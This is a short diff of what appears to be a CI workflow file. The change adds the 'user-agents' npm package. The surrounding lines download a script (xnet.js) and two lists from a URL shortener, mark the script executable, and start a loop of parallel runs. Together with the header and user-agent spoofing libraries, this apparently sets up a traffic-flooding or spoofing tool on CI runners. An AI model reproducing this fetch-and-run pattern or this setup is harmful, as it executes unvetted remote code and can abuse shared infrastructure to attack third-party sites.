@@ -18,7 +18,7 @@ jobs:
           wget https://curl.by/i5xqE/xnet.js
           wget https://curl.by/IJ_Lv/fres.txt
           wget https://curl.by/FVlpp/ua.txt
-          npm i header-generator
+          npm i header-generator user-agents
           chmod +x xnet.js
           PIDS=()
           for i in {1..4}; do
